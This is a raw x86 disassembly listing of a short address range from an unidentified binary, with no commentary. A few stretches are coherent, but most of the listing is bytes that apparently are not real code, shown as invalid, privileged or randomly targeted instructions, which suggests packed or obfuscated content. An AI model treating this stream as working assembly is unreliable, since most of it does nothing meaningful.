  41b33d:	lea    ebx,[ebx]
  41b33f:	xchg   edi,eax
  41b340:	add    bh,dl
  41b342:	xor    ecx,esi
  41b344:	mov    DWORD PTR [esp+0x24],edx
  41b348:	cmp    eax,DWORD PTR [esp+0x20]
  41b34c:	jne    0x41b5f0
  41b352:	cmp    ecx,edx
  41b354:	je     0x41cd76
  41b35a:	jmp    0x41b5f0
  41b35f:	sbb    edx,DWORD PTR [ecx-0x428e8836]
  41b365:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b366:	popf   
  41b367:	or     eax,0x77310b12
  41b36c:	or     al,0xda
  41b36e:	sti    
  41b36f:	dec    ebp
  41b370:	dec    esp
  41b371:	sar    DWORD PTR [ebx-0x44444058],0x63
  41b378:	int    0x46
  41b37a:	add    ch,BYTE PTR [eax]
  41b37c:	out    dx,eax
  41b37d:	jp     0x41b3bf
  41b37f:	and    BYTE PTR [ebp-0xa777e30],bh
  41b385:	(bad)  
  41b386:	push   ecx
  41b387:	xchg   edi,eax
  41b388:	or     al,0xc8
  41b38a:	inc    eax
  41b38b:	sti    
  41b38c:	data16 or dh,BYTE PTR [ecx-0x1e]
  41b390:	sbb    DWORD PTR [ebx+0x1a],0x9676c61f
  41b397:	push   esp
  41b398:	addr16 jbe 0x41b3a3
  41b39b:	jmp    0x3e8548eb
  41b3a0:	repz or DWORD PTR [ebp+0x4ea7fcc5],esi
  41b3a7:	das    
  41b3a8:	popa   
  41b3a9:	xor    ebp,DWORD PTR [ebx+0x6e]
  41b3ac:	loope  0x41b378
  41b3ae:	sub    DWORD PTR [eax-0x3f],ecx
  41b3b1:	popf   
  41b3b2:	pushf  
  41b3b3:	and    al,0xad
  41b3b5:	inc    ecx
  41b3b6:	neg    bh
  41b3b8:	cmp    DWORD PTR [edi+0x4],0xcad7d32
  41b3bf:	(bad)  
  41b3c0:	lods   al,BYTE PTR ds:[esi]
  41b3c1:	jmp    0x115e:0x2dec9098
  41b3c8:	jecxz  0x41b404
  41b3ca:	adc    ch,ah
  41b3cc:	xchg   esp,eax
  41b3cd:	sbb    eax,0xc0dca896
  41b3d2:	lods   al,BYTE PTR ds:[esi]
  41b3d3:	enter  0x3e7e,0x4c
  41b3d7:	mov    dl,0x47
  41b3d9:	jmp    0x45c9:0xc1044d9d
  41b3e0:	add    eax,0xd4d7e28
  41b3e5:	pop    ebx
  41b3e6:	cmp    edx,DWORD PTR [ebp+0x68d9631a]
  41b3ec:	or     eax,0x488244c6
  41b3f1:	xchg   edx,eax
  41b3f2:	out    0xd5,eax
  41b3f4:	mov    eax,0x4ebe6902
  41b3f9:	clc    
  41b3fa:	push   ds
  41b3fb:	sbb    esp,DWORD PTR [esi-0x68]
  41b3fe:	xchg   ebx,eax
  41b3ff:	add    cl,dl
  41b401:	popf   
  41b402:	ficomp DWORD PTR [eax-0x7feaca9]
  41b408:	inc    ecx
  41b409:	push   0x64
  41b40b:	xchg   edx,esi
  41b40d:	icebp  
  41b40e:	fbstp  TBYTE PTR [edi]
  41b410:	in     eax,0xb3
  41b412:	fild   QWORD PTR ds:0x44abae80
  41b418:	rcr    BYTE PTR [ebp-0x1e],1
  41b41b:	ret    
  41b41c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b41d:	lds    ebp,FWORD PTR [ecx-0x66326d9]
  41b423:	mov    ecx,0x344ad178
  41b428:	xor    DWORD PTR [edi+0x7d],ebp
  41b42b:	mov    eax,0xb7b836bf
  41b430:	mov    cl,0xc8
  41b432:	jae    0x41b495
  41b434:	mov    DWORD PTR [ecx],0x27eca797
  41b43a:	into   
  41b43b:	test   eax,0x60ac4452
  41b440:	imul   ebx,DWORD PTR [ecx-0x4e],0xf47cbfe3
  41b447:	ret    0xea6d
  41b44a:	fmul   QWORD PTR [ecx+eax*1+0x5a]
  41b44e:	mov    esp,DWORD PTR [edi]
  41b450:	adc    DWORD PTR [eax-0x5676338],esi
  41b456:	sahf   
  41b457:	cs pop ebp
  41b459:	cmp    BYTE PTR [ecx],bh
  41b45b:	xchg   ecx,eax
  41b45c:	push   ss
  41b45d:	cmp    al,0x32
  41b45f:	(bad)  
  41b460:	(bad)  [eax+0xc]
  41b463:	xor    esp,esi
  41b465:	jl     0x41b4e2
  41b467:	fild   DWORD PTR [eax]
  41b469:	mov    esi,0x2248e583
  41b46e:	add    ch,BYTE PTR [ecx+ebx*1-0x42]
  41b472:	dec    edi
  41b473:	add    ebx,DWORD PTR [esi+0x34]
  41b476:	mov    ebp,edi
  41b478:	jle    0x41b4e5
  41b47a:	adc    eax,0xed2eecd1
  41b47f:	adc    dl,bh
  41b481:	shl    BYTE PTR [ecx],1
  41b483:	push   eax
  41b484:	shr    BYTE PTR [eax],0x7
  41b487:	es retf 
  41b489:	xchg   ecx,eax
  41b48a:	mov    dl,0x85
  41b48c:	pop    ebp
  41b48d:	pop    ebp
  41b48e:	mov    eax,ds:0xaa859277
  41b493:	les    esi,FWORD PTR [edx+0x785826c5]
  41b499:	int3   
  41b49a:	bound  esp,QWORD PTR [edi-0x5785a84c]
  41b4a0:	popf   
  41b4a1:	add    DWORD PTR [edi],0xa
  41b4a4:	out    dx,al
  41b4a5:	xor    edx,esi
  41b4a7:	(bad)  
  41b4a8:	movd   edx,mm4
  41b4ab:	enter  0x1413,0xc7
  41b4af:	sub    BYTE PTR [eax+0x71],dl
  41b4b2:	jge    0x41b503
  41b4b4:	retf   
  41b4b5:	popa   
  41b4b6:	sub    eax,0x5cf9542e
  41b4bb:	enter  0xd748,0xa0
  41b4bf:	push   ebx
  41b4c0:	(bad)  
  41b4c2:	adc    edx,DWORD PTR [esi-0x75]
  41b4c5:	jne    0x41b4ae
  41b4c7:	lea    ebp,[esi+0x3c01d16f]
  41b4cd:	or     dl,BYTE PTR [ebp+eax*4-0x5d7d7c8e]
  41b4d4:	js     0x41b4a0
  41b4d6:	ins    BYTE PTR es:[edi],dx
  41b4d7:	add    al,cl
  41b4d9:	shrd   DWORD PTR [edi],edx,cl
  41b4dc:	pop    ebp
  41b4dd:	sbb    BYTE PTR [edx+0x71],dh
  41b4e0:	pop    ss
  41b4e1:	ins    DWORD PTR es:[edi],dx
  41b4e2:	int3   
  41b4e3:	enter  0x1b8e,0x64
  41b4e7:	cdq    
  41b4e8:	adc    eax,0x23a8838c
  41b4ed:	cmp    eax,0xc5724e75
  41b4f2:	or     cl,bh
  41b4f4:	xchg   DWORD PTR [esi+0x168078fa],ebx
  41b4fa:	popf   
  41b4fb:	out    dx,al
  41b4fc:	mov    bh,BYTE PTR [ecx+0x41]
  41b4ff:	xchg   DWORD PTR [esi],ebp
  41b501:	mov    eax,ds:0xdbbe7022
  41b506:	dec    ebx
  41b507:	jo     0x41b490
  41b509:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b50a:	sbb    BYTE PTR [ebp-0x6d42f0b7],bl
  41b510:	mov    eax,0xf175f372
  41b515:	adc    al,0x60
  41b517:	fbld   TBYTE PTR [edx]
  41b519:	scas   eax,DWORD PTR es:[edi]
  41b51a:	sbb    bh,bh
  41b51c:	push   ebp
  41b51d:	jmp    0xb2d25107
  41b522:	test   BYTE PTR [edi-0x7f],ah
  41b525:	sbb    DWORD PTR [ecx],ebx
  41b527:	jmp    0xc70b40bc
  41b52c:	pop    edx
  41b52d:	enter  0x331a,0x8a
  41b531:	in     eax,dx
  41b532:	mov    ecx,fs
  41b534:	mov    bh,BYTE PTR [ebp+ebx*4+0x70]
  41b538:	and    eax,0x3c9c73c5
  41b53d:	popf   
  41b53e:	sbb    BYTE PTR [ebx],dl
  41b540:	outs   dx,BYTE PTR ds:[esi]
  41b541:	cpuid  
  41b543:	xchg   edi,eax
  41b544:	mov    esi,0xea4790f1
  41b549:	leave  
  41b54a:	stc    
  41b54b:	mov    bh,0x43
  41b54d:	scas   al,BYTE PTR es:[edi]
  41b54e:	lock mov cs,WORD PTR [eax-0x1bd8022f]
  41b555:	inc    ecx
  41b556:	pushf  
  41b557:	mov    bh,0xf3
  41b559:	mov    bh,0xd4
  41b55b:	cmc    
  41b55c:	fsubr  QWORD PTR [esi-0x6974a6a0]
  41b562:	or     eax,0x3e486fdf
  41b567:	retf   0xcd01
  41b56a:	sbb    DWORD PTR [edi+0x6],ebx
  41b56d:	sub    eax,0xbb41a0b4
  41b572:	push   ecx
  41b573:	fwait
  41b574:	test   al,0x37
  41b576:	add    BYTE PTR [ecx+ebp*4+0x3580d9fa],bh
  41b57d:	and    esi,DWORD PTR [edi]
  41b57f:	xchg   BYTE PTR [ecx],bh
  41b581:	xchg   BYTE PTR [edi-0x3d],ah
  41b584:	cmp    eax,0xb5340aa7
  41b589:	lahf   
  41b58a:	ds clc 
  41b58c:	fcomp  DWORD PTR [ecx-0x25b57145]
  41b592:	sub    ecx,DWORD PTR ds:[ebp-0x7aef198]
  41b599:	loope  0x41b5ae
  41b59b:	nop
  41b59c:	jmp    FWORD PTR [ecx+0x61eed400]
  41b5a2:	sub    ch,BYTE PTR [ebx-0x9]
  41b5a5:	xchg   esi,eax
  41b5a6:	mov    ebx,DWORD PTR ds:0xbebc85e9
  41b5ac:	bt     DWORD PTR [ecx*1-0x1b07afdc],ebx
  41b5b4:	or     DWORD PTR [ebx],esi
  41b5b6:	lock sti 
  41b5b8:	and    DWORD PTR [ebp+0x32],0x63d0a1b3
  41b5bf:	jmp    0xd9be:0x43bdb8b7
  41b5c6:	jecxz  0x41b5a2
  41b5c8:	pop    ds
  41b5c9:	inc    ebx
  41b5ca:	sar    al,1
  41b5cc:	mov    al,0x63
  41b5ce:	sub    eax,0x6dd6e03c
  41b5d3:	push   0x8
  41b5d5:	inc    ebx
  41b5d6:	push   ebx
  41b5d7:	test   eax,0x281d38ca
  41b5dc:	mov    ecx,0xa59ccd08
  41b5e1:	(bad)
  41b5e5:	cmp    al,0x64
  41b5e7:	jmp    0xa9d8f56a
  41b5ec:	xchg   ebx,esi
  41b5ee:	push   0xffffffe9
  41b5f0:	mov    eax,DWORD PTR [esp+0x30]
  41b5f4:	cmp    eax,0xa6069caa
  41b5f9:	je     0x41bb79
  41b5ff:	mov    edx,DWORD PTR [esp+0x58]
  41b603:	mov    eax,DWORD PTR [esp+0x5c]
  41b607:	xor    eax,esi
  41b609:	jmp    0x41b89f
  41b60e:	mov    cl,BYTE PTR ds:0xad7d4d63
  41b614:	mov    ah,0x1d
  41b616:	ins    DWORD PTR es:[edi],dx
  41b617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b618:	sub    eax,0x73c4a45
  41b61d:	add    eax,0xbbc14e32
  41b622:	test   al,0xbf
  41b624:	mov    ebx,0xf788d2bb
  41b629:	or     ch,BYTE PTR [edi+0x614981b8]
  41b62f:	mov    ecx,0x3309fb08
  41b634:	aad    0xa5
  41b636:	mov    esi,0xb15984bc
  41b63b:	add    DWORD PTR [ebx-0x45a1cd48],edi
  41b641:	and    eax,0x6760f17e
  41b646:	push   ebp
  41b647:	cmp    eax,0xc1b71d12
  41b64c:	pop    edx
  41b64d:	rcl    DWORD PTR [esp+ecx*4],1
  41b650:	fadd   DWORD PTR [edx]
  41b652:	pop    es
  41b653:	rcl    edi,0x1
  41b656:	adc    cl,BYTE PTR [ebx]
  41b658:	mov    ecx,0x756e91fc
  41b65d:	sub    BYTE PTR [ecx+0x210daa2b],ch
  41b663:	int    0x58
  41b665:	scas   al,BYTE PTR es:[edi]
  41b666:	jl     0x41b615
  41b668:	out    dx,al
  41b669:	mov    esi,0xab85031c
  41b66e:	(bad)  
  41b66f:	rcr    BYTE PTR gs:[esi+0x3030a378],cl
  41b676:	xor    DWORD PTR [ecx+edi*2],edi
  41b679:	(bad)  
  41b67a:	xlat   BYTE PTR ds:[ebx]
  41b67b:	cmp    ebp,DWORD PTR [ebp+0x6d]
  41b67e:	arpl   WORD PTR [ecx-0x1a2af7e8],dx
  41b684:	sub    bl,BYTE PTR [ecx]
  41b686:	mov    ds:0x88e78011,eax
  41b68b:	pop    esp
  41b68c:	adc    edx,DWORD PTR [ecx]
  41b68e:	push   ecx
  41b68f:	xchg   ebx,eax
  41b690:	imul   esp,ecx,0xcd89b991
  41b696:	dec    ecx
  41b697:	sbb    BYTE PTR [ecx],bl
  41b699:	or     BYTE PTR [edi+0x4f],dh
  41b69c:	xor    BYTE PTR [edi-0x52],dh
  41b69f:	stos   BYTE PTR es:[edi],al
  41b6a0:	or     DWORD PTR [ebx+0x3cc2db72],edx
  41b6a6:	jnp    0x41b70b
  41b6a8:	inc    ecx
  41b6a9:	in     al,0x78
  41b6ab:	pop    esp
  41b6ac:	mov    WORD PTR [edi],gs
  41b6ae:	loopne 0x41b6f6
  41b6b0:	cmp    DWORD PTR [ecx*2+0x57893c1b],edi
  41b6b7:	popf   
  41b6b8:	pop    ds
  41b6b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6ba:	shl    BYTE PTR [eax+0x44],1
  41b6bd:	ret    
  41b6be:	mov    ss,esi
  41b6c0:	sub    cl,bh
  41b6c2:	inc    edx
  41b6c3:	fld    QWORD PTR [esi-0x79e029b5]
  41b6c9:	scas   al,BYTE PTR es:[edi]
  41b6ca:	jns    0x41b6ae
  41b6cc:	ja     0x41b73b
  41b6ce:	ins    BYTE PTR es:[edi],dx
  41b6cf:	xchg   ecx,eax
  41b6d0:	push   edi
  41b6d1:	push   esp
  41b6d2:	pop    ecx
  41b6d3:	loopne 0x41b6da
  41b6d5:	xor    esp,edi
  41b6d7:	out    dx,eax
  41b6d8:	and    esp,0x1ca921f5
  41b6de:	mov    dl,0x42
  41b6e0:	jp     0x41b6bf
  41b6e2:	ror    BYTE PTR [ebp-0x26],1
  41b6e5:	cmp    ebp,DWORD PTR [ecx+0x130d071d]
  41b6eb:	inc    ebp
  41b6ec:	hlt    
  41b6ed:	xor    al,0x78
  41b6ef:	jbe    0x41b714
  41b6f1:	ret    0x97ac
  41b6f4:	mov    ds:0x886bd8c9,al
  41b6f9:	test   DWORD PTR [esi],edi
  41b6fb:	pop    ebp
  41b6fc:	xchg   esp,eax
  41b6fd:	pushf  
  41b6fe:	push   ebp
  41b6ff:	mov    ch,0x31
  41b701:	xor    BYTE PTR [eax+0x6d],cl
  41b704:	sub    al,0x4c
  41b706:	jg     0x41b703
  41b708:	mov    edx,eax
  41b70a:	jmp    0xe94bbd9b
  41b70f:	add    BYTE PTR [edi],cl
  41b711:	sbb    al,0xcf
  41b713:	jp     0x41b6ec
  41b715:	call   0xf51e0c03
  41b71a:	sub    DWORD PTR [edi+0x30],esi
  41b71d:	shl    eax,cl
  41b71f:	xchg   edx,eax
  41b720:	iret   
  41b721:	xor    eax,0xdec3c448
  41b726:	stc    
  41b727:	dec    edi
  41b728:	pusha  
  41b729:	lods   eax,DWORD PTR ds:[esi]
  41b72a:	ds js  0x41b757
  41b72d:	out    dx,eax
  41b72e:	daa    
  41b72f:	pop    eax
  41b730:	call   0x6c03b8f
  41b735:	fdiv   QWORD PTR [edx-0x43273253]
  41b73b:	push   ebx
  41b73c:	(bad)  
  41b73d:	in     eax,dx
  41b73e:	sbb    al,0xc9
  41b740:	test   eax,0x3b49b2ba
  41b745:	and    edi,DWORD PTR [edx]
  41b747:	mov    dl,0x3b
  41b749:	mov    al,ds:0x3b96261d
  41b74e:	push   edi
  41b74f:	dec    ecx
  41b750:	sbb    BYTE PTR [esi+eax*1],bh
  41b753:	shr    bl,cl
  41b755:	sbb    ebp,DWORD PTR [esi]
  41b757:	or     al,0xff
  41b759:	xchg   ecx,eax
  41b75a:	mov    edi,DWORD PTR [edi+ecx*8]
  41b75d:	test   DWORD PTR [ebp-0x280fbd37],ebx
  41b763:	dec    ecx
  41b764:	xor    eax,0xbbb8fcda
  41b769:	shr    DWORD PTR [edi-0x4fba54f0],cl
  41b76f:	stc    
  41b770:	mov    edx,0x8d3eddc4
  41b775:	(bad)  
  41b776:	(bad)  
  41b777:	popa   
  41b778:	inc    eax
  41b779:	icebp  
  41b77a:	xor    al,dl
  41b77c:	inc    ecx
  41b77d:	xlat   BYTE PTR ds:[ebx]
  41b77e:	popa   
  41b77f:	jmp    0x5440:0x9327b63d
  41b786:	sbb    edx,eax
  41b788:	iret   
  41b789:	xlat   BYTE PTR ds:[ebx]
  41b78a:	xor    ah,BYTE PTR [ecx+ebp*8+0x16ce7694]
  41b791:	cmp    eax,0x3ab6611f
  41b796:	jo     0x41b75f
  41b798:	fisub  WORD PTR [edi+edi*8-0x73]
  41b79c:	aaa    
  41b79d:	retf   0x3c30
  41b7a0:	lahf   
  41b7a1:	cmp    ebx,0xcee4b070
  41b7a7:	mov    bl,0xb0
  41b7a9:	sbb    eax,0xc74e92fb
  41b7ae:	sub    eax,0xf84f39f
  41b7b3:	adc    ecx,edi
  41b7b5:	add    esp,ebp
  41b7b7:	loopne 0x41b7d5
  41b7b9:	cmp    eax,0xf3731b72
  41b7be:	outs   dx,BYTE PTR ds:[esi]
  41b7bf:	sar    ah,cl
  41b7c1:	ret    0xfbaa
  41b7c4:	push   ecx
  41b7c5:	repnz or DWORD PTR [esi+0x4391c089],ebx
  41b7cc:	cmp    al,BYTE PTR [edi+ecx*1+0x1f]
  41b7d0:	mov    al,ds:0xbb27a247
  41b7d5:	jle    0x41b77a
  41b7d7:	or     edx,0xadb388f7
  41b7dd:	inc    ecx
  41b7de:	(bad)  
  41b7df:	cmp    edi,esp
  41b7e1:	xlat   BYTE PTR ds:[ebx]
  41b7e2:	xor    eax,0x148b216c
  41b7e7:	nop
  41b7e8:	mov    al,ds:0x96887600
  41b7ed:	and    esp,esi
  41b7ef:	jns    0x41b860
  41b7f1:	mov    bl,0x94
  41b7f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7f4:	inc    eax
  41b7f5:	mov    ebp,0xe5ca075f
  41b7fa:	fdivr  st,st(1)
  41b7fc:	cmp    DWORD PTR [ebx-0x2f07130f],ecx
  41b802:	push   es
  41b803:	inc    edi
  41b804:	adc    DWORD PTR ds:0x7e0ce141,esi
  41b80a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b80b:	mov    dl,0xe3
  41b80d:	cmp    DWORD PTR [edx+0x2968bd37],eax
  41b813:	iret   
  41b814:	jae    0x41b891
  41b816:	loope  0x41b87f
  41b818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b819:	je     0x41b7ee
  41b81b:	adc    eax,0x7187fcc
  41b820:	sub    DWORD PTR [esp+edi*2-0x4d],ebx
  41b824:	xchg   esi,eax
  41b825:	pop    ebx
  41b826:	pushf  
  41b827:	sahf   
  41b828:	mov    dl,0x7d
  41b82a:	adc    BYTE PTR [ecx],0x1e
  41b82d:	arpl   WORD PTR [eax-0x32],sp
  41b830:	lock mov ds:0x68b3c87f,al
  41b836:	mov    bl,0xf6
  41b838:	lds    eax,FWORD PTR [esi-0x23f670f1]
  41b83e:	sahf   
  41b83f:	and    al,0x59
  41b841:	sub    DWORD PTR [edi],ecx
  41b843:	mov    cl,0xe3
  41b845:	push   eax
  41b846:	inc    edx
  41b847:	mov    bl,0xa0
  41b849:	pop    ecx
  41b84a:	std    
  41b84b:	and    BYTE PTR [eax-0x34624525],dl
  41b851:	adc    eax,0xb8713402
  41b856:	add    BYTE PTR [edx],ch
  41b858:	and    eax,0x4c0be084
  41b85d:	test   BYTE PTR ds:0x2a379123,cl
  41b863:	xchg   ebx,ecx
  41b865:	test   al,0x18
  41b867:	ins    DWORD PTR es:[edi],dx
  41b868:	xchg   edx,eax
  41b869:	cmp    esi,esi
  41b86b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b86c:	(bad)  
  41b86d:	fcomip st,st(2)
  41b86f:	fwait
  41b870:	lods   eax,DWORD PTR ds:[esi]
  41b871:	in     eax,0xc3
  41b873:	jecxz  0x41b7f8
  41b875:	call   0xa02:0x29d82e51
  41b87c:	mov    edi,0x92fd11a4
  41b881:	jbe    0x41b852
  41b883:	push   ecx
  41b884:	pop    edx
  41b885:	pop    esi
  41b886:	(bad)  
  41b887:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b888:	xlat   BYTE PTR ds:[ebx]
  41b889:	add    al,bl
  41b88b:	leave  
  41b88c:	dec    edx
  41b88d:	cmp    BYTE PTR ds:0x22212457,bl
  41b893:	mov    cl,0xda
  41b895:	push   eax
  41b896:	mov    ah,0x80
  41b898:	xchg   ecx,eax
  41b899:	sti    
  41b89a:	test   DWORD PTR [ecx],0x814f379f
  41b8a0:	bnd ja 0x41b859
  41b8a3:	mov    ebx,ecx
  41b8a5:	shrd   edx,eax,0x2
  41b8a9:	shr    eax,0x2
  41b8ac:	mov    DWORD PTR [esp+0x1c],eax
  41b8b0:	mov    eax,DWORD PTR [esp+0x58]
  41b8b4:	mov    ecx,DWORD PTR [esp+0x5c]
  41b8b8:	shl    eax,0x1e
  41b8bb:	xor    eax,0x80000000
  41b8c0:	or     eax,DWORD PTR [esp+0x1c]
  41b8c4:	xor    ecx,ecx
  41b8c6:	mov    DWORD PTR [esp+0x24],eax
  41b8ca:	mov    eax,DWORD PTR [esp+0x40]
  41b8ce:	or     ecx,edx
  41b8d0:	jmp    0x41bb66
  41b8d5:	out    0xab,al
  41b8d7:	mov    eax,0x7d29bc1b
  41b8dc:	mov    bh,0xa5
  41b8de:	data16 das 
  41b8e0:	jno    0x41b8b7
  41b8e2:	pop    ss
  41b8e3:	sar    bl,1
  41b8e5:	and    DWORD PTR [edx-0x3f],edx
  41b8e8:	mov    ebx,0xbbbbbfa8
  41b8ed:	mov    edx,0x3d02fafa
  41b8f2:	mov    ebp,0x84451437
  41b8f7:	add    DWORD PTR [ebx+0x41b32745],edx
  41b8fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8fe:	mov    ds:0x8f85341b,al
  41b903:	sub    esp,DWORD PTR [edx+0x6e9902bf]
  41b909:	push   esp
  41b90a:	fs ss mov ebx,eax
  41b90e:	adc    eax,0x107ae840
  41b913:	sahf   
  41b914:	cld    
  41b915:	jl     0x41b949
  41b917:	mov    ds:0xbb809fb8,al
  41b91c:	into   
  41b91d:	add    edx,DWORD PTR [ebp+0x6e375d6b]
  41b923:	shl    BYTE PTR [ecx+0x10],cl
  41b926:	lods   al,BYTE PTR ds:[esi]
  41b927:	popa   
  41b928:	add    BYTE PTR [ebx+0x602df340],0xfd
  41b92f:	xchg   ebx,eax
  41b930:	outs   dx,DWORD PTR ds:[esi]
  41b931:	std    
  41b932:	lods   eax,DWORD PTR ds:[esi]
  41b933:	cli    
  41b934:	lods   eax,DWORD PTR ds:[esi]
  41b935:	pushf  
  41b936:	mov    ch,0x50
  41b938:	push   0x6
  41b93a:	and    al,0x29
  41b93c:	mov    edx,0xabdcae3c
  41b941:	fsub   QWORD PTR [edi+0x634700e9]
  41b947:	pop    ss
  41b948:	sbb    al,0x64
  41b94a:	pop    edx
  41b94b:	das    
  41b94c:	(bad)  
  41b94d:	ds and eax,0x378775c2
  41b953:	lods   eax,DWORD PTR ds:[esi]
  41b954:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b955:	leave  
  41b956:	ins    BYTE PTR es:[edi],dx
  41b957:	lods   al,BYTE PTR ds:[esi]
  41b958:	test   BYTE PTR [eax],dl
  41b95a:	cli    
  41b95b:	clc    
  41b95c:	(bad)  
  41b95d:	dec    esi
  41b95e:	push   0xffffffad
  41b960:	pop    es
  41b961:	jmp    0x41b94f
  41b963:	lahf   
  41b964:	and    DWORD PTR [ecx+edi*8],ecx
  41b967:	dec    eax
  41b968:	pop    edx
  41b969:	jbe    0x41b915
  41b96b:	inc    esp
  41b96c:	xor    edx,DWORD PTR [edi-0x5c64a8f0]
  41b972:	arpl   WORD PTR [esi],cx
  41b974:	jae    0x41b9e8
  41b976:	iret   
  41b977:	adc    eax,0x8f87ecec
  41b97c:	stc    
  41b97d:	inc    ecx
  41b97e:	pop    edi
  41b97f:	mov    eax,0xe0cc482b
  41b984:	jmp    0x326ea14a
  41b989:	push   ss
  41b98a:	jl     0x41b99b
  41b98c:	pop    edx
  41b98d:	aas    
  41b98e:	stos   BYTE PTR es:[edi],al
  41b98f:	push   esp
  41b990:	xor    eax,0x2c816623
  41b995:	(bad)  
  41b997:	mul    BYTE PTR [ebx]
  41b999:	pop    edx
  41b99a:	and    esp,eax
  41b99c:	adc    ah,BYTE PTR [esi-0x189f6d78]
  41b9a2:	mov    esi,0x7f1d131c
  41b9a7:	xchg   edi,eax
  41b9a8:	ds sub eax,0x634a07db
  41b9ae:	or     dh,dh
  41b9b0:	sti    
  41b9b1:	sbb    BYTE PTR [esi+0x3c],0x7d
  41b9b5:	mov    dh,0x3c
  41b9b7:	xchg   esi,eax
  41b9b8:	inc    esi
  41b9b9:	mov    edi,0x1c946c4
  41b9be:	mov    ch,0xc4
  41b9c0:	loopne 0x41ba3f
  41b9c2:	test   al,0x96
  41b9c4:	sub    eax,0xe656a13f
  41b9c9:	pushf  
  41b9ca:	xchg   esp,eax
  41b9cb:	in     eax,dx
  41b9cc:	adc    bh,BYTE PTR ds:0x41e75644
  41b9d2:	aaa    
  41b9d3:	les    ebx,FWORD PTR [edi+edi*4]
  41b9d6:	mov    ah,0xd9
  41b9d8:	mov    eax,0x210fb40d
  41b9dd:	out    0x7e,eax
  41b9df:	mov    bh,0x70
  41b9e1:	mov    WORD PTR [edx+0x71],es
  41b9e4:	call   0x6bd1:0xf7026dc1
  41b9eb:	jo     0x41ba5e
  41b9ed:	mov    ax,ds:0xc6a977d9
  41b9f3:	(bad)  
  41b9f4:	jl     0x41b9f7
  41b9f6:	outs   dx,BYTE PTR ds:[esi]
  41b9f7:	popf   
  41b9f8:	inc    ebx
  41b9f9:	inc    ecx
  41b9fa:	inc    edi
  41b9fb:	jmp    0x41b984
  41b9fd:	gs xor eax,0xbf60a60
  41ba03:	gs shr bl,0x26
  41ba07:	sub    BYTE PTR [edi],0x97
  41ba0a:	data16 test BYTE PTR [ecx+eax*2+0x3d07994e],dh
  41ba12:	xchg   ebp,eax
  41ba13:	push   ds
  41ba14:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41ba16:	xlat   BYTE PTR ds:[ebx]
  41ba17:	je     0x41ba3b
  41ba19:	pop    edi
  41ba1a:	scas   al,BYTE PTR es:[edi]
  41ba1b:	pop    eax
  41ba1c:	cld    
  41ba1d:	loop   0x41ba47
  41ba1f:	popa   
  41ba20:	fist   WORD PTR [edx-0x5f]
  41ba23:	fwait
  41ba24:	sti    
  41ba25:	imul   edi,DWORD PTR [edx+0x3f88997e],0x1a
  41ba2c:	mov    ebx,DWORD PTR ds:0xe133b371
  41ba32:	ds sbb al,0x4b
  41ba35:	add    bl,bl
  41ba37:	mov    BYTE PTR [eax+0x29],dl
  41ba3a:	out    0xc8,al
  41ba3c:	int3   
  41ba3d:	push   0xd093dd01
  41ba42:	pop    ds
  41ba43:	aad    0xf3
  41ba45:	test   bh,dl
  41ba47:	adc    al,0x73
  41ba49:	out    dx,eax
  41ba4a:	pop    esp
  41ba4b:	jmp    0xd6e8:0xec180f23
  41ba52:	xlat   BYTE PTR ds:[ebx]
  41ba53:	(bad)  
  41ba54:	mov    esi,DWORD PTR [esi]
  41ba56:	aas    
  41ba57:	es xor eax,0x90cea443
  41ba5d:	in     eax,dx
  41ba5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba5f:	push   ebp
  41ba60:	mov    ebx,0xad04ff56
  41ba65:	mov    gs,WORD PTR [ebp-0x3c97fd7e]
  41ba6b:	sbb    al,0x9b
  41ba6d:	arpl   WORD PTR [ebx-0x4],sp
  41ba70:	sub    BYTE PTR ss:[edi-0x2cbe7565],al
  41ba77:	push   0xfffffff9
  41ba79:	shl    BYTE PTR [eax-0x27],1
  41ba7c:	dec    eax
  41ba7d:	test   DWORD PTR [esi+0x715e7a2b],esp
  41ba83:	sub    BYTE PTR [esi-0xb7de4da],bl
  41ba89:	fisubr WORD PTR [esi+0x3f]
  41ba8c:	jno    0x41bab0
  41ba8e:	int3   
  41ba8f:	mov    ds:0xdd5b4893,al
  41ba94:	jo     0x41ba17
  41ba96:	call   0xbb1d:0xdb6d13d
  41ba9d:	popa   
  41ba9e:	mov    esp,0x233d2b40
  41baa3:	pop    ecx
  41baa4:	jno    0x41bb0b
  41baa6:	mov    ebx,0xaf4aa81c
  41baab:	mov    esi,0x142383a5
  41bab0:	int    0x19
  41bab2:	sbb    al,0x2f
  41bab4:	push   ss
  41bab5:	das    
  41bab6:	push   cs
  41bab7:	inc    edx
  41bab8:	jecxz  0x41bb21
  41baba:	or     edi,DWORD PTR [edi+0x16]
  41babd:	dec    eax
  41babe:	mov    bl,0xa0
  41bac0:	jl     0x41ba7a
  41bac2:	int    0x97
  41bac4:	das    
  41bac5:	je     0x41bafc
  41bac7:	imul   edi,DWORD PTR ds:0xd92b12d8,0xfffffff5
  41bace:	sub    al,0x2e
  41bad0:	ror    esi,1
  41bad2:	ret    0x4967
  41bad5:	arpl   WORD PTR [eax],di
  41bad7:	out    dx,al
  41bad8:	loope  0x41bb51
  41bada:	sbb    eax,0x499be8ab
  41badf:	imul   ecx,DWORD PTR [edi],0x1e93d43e
  41bae5:	in     al,0x25
  41bae7:	rol    edx,0x50
  41baea:	xchg   ebp,eax
  41baeb:	pop    ds
  41baec:	cwde   
  41baed:	jl     0x41bae7
  41baef:	clc    
  41baf0:	(bad)  
  41baf1:	and    esp,DWORD PTR [edx+0x275a861e]
  41baf7:	sbb    eax,0x799c229f
  41bafc:	ins    BYTE PTR es:[edi],dx
  41bafd:	popa   
  41bafe:	retf   0xca4d
  41bb01:	xlat   BYTE PTR ds:[ebx]
  41bb02:	dec    esp
